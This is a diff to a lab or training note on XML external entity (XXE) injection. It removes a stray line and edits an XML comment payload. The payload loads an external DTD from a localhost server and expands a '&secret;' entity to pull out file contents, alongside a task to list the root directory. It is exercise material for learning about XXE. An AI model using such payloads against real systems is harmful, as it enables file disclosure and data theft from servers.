@@ -1,7 +1,5 @@
 # XEE - xml external entities
 
-Szymon ma małego
-
 # Task 4
 
 In this assignment you will add a comment to the photo, when submitting the form try to execute an XXE injection with the comments field. Try listing the root directory of the filesystem.
@@ -73,7 +71,7 @@ http://localhost:9090/files/admin123/attack.dtd
 <!ENTITY % dtd SYSTEM "http://localhost:9090/files/admin123/attack.dtd" >
 %dtd;]>
 <comment>
-<text>comment comment comment &secret;</text>
+<text>our secret &secret;</text>
 </comment>
 ```
 
